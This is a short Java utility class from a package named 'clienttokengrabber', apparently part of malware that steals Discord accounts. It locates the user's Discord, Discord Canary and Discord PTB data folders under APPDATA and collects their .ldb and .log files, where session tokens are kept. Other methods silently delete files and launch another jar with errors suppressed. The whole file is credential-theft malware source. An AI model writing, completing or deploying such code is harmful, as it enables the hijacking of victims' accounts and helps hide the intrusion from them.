package clienttokengrabber.utils;

import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;

public class FileManager {
    public static final String ROAMING = System.getenv("APPDATA");
    private static List<String> defaultPaths = new ArrayList<>();

    public static List<String> getDefaultPaths() {
        loadDefaultPaths();
        return defaultPaths;
    }
    private static void loadDefaultPaths() {
        defaultPaths.add(Paths.get(ROAMING, "discord").toString());
        defaultPaths.add(Paths.get(ROAMING, "discordcanary").toString());
        defaultPaths.add(Paths.get(ROAMING, "discordptb").toString());
    }

    public static List<File> listValidFiles(String path) {
        List<File> validFiles = new ArrayList<>();

        File directory = new File(path);
        if (!directory.exists()) return validFiles;

        for (File file : directory.listFiles()) {
            String fileName = file.getName();
            if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) validFiles.add(file);
        }

        return validFiles;
    }

    public static void delete(String filePath) {
        File file = new File(filePath);
        if (file.exists()) file.delete();
    }

    public static void launch(String appPath) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("java", "-jar", appPath);
            Process process = processBuilder.start();
        } catch (Exception ignored) {}
    }
}
